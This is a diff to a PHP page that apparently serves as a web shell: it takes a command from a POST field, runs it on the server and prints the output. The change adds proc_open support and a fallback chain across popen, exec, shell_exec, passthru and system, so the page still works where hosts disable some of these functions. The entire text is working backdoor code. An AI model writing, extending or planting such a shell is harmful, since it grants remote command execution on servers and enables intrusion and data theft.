@@ -99,7 +99,19 @@
         <textarea readonly="readonly" rows="25" class="cmd-box">
 <?php
     if($execute) {
-        if(function_exists("popen")) {
+        if(function_exists("proc_open")) {
+            $exec_func = "proc_open";
+            $descriptorspec = array(
+                0 => array("pipe", "r"),
+                1 => array("pipe", "w"),
+                2 => array("pipe", "w")
+            );
+            $proc = $exec_func($_POST["cmd"], $descriptorspec, $pipes);
+            echo htmlspecialchars(stream_get_contents($pipes[1]));
+            echo htmlspecialchars(stream_get_contents($pipes[2]));
+            array_map("fclose", $pipes);
+            $exit_code = proc_close($proc);
+        } else if(function_exists("popen")) {
             $exec_func = "popen";
             $handle = $exec_func($_POST["cmd"], "r");
             echo htmlspecialchars(stream_get_contents($handle));
@@ -119,7 +131,7 @@
             $exec_func($_POST["cmd"], $exit_code);
         } else {
             echo "Error - All of the following execution functions have been disabled in PHP:\n";
-            echo "popen\nexec\nshell_exec\npassthru\nsystem\n";
+            echo "proc_open\npopen\nexec\nshell_exec\npassthru\nsystem\n";
         }
     }
 ?>
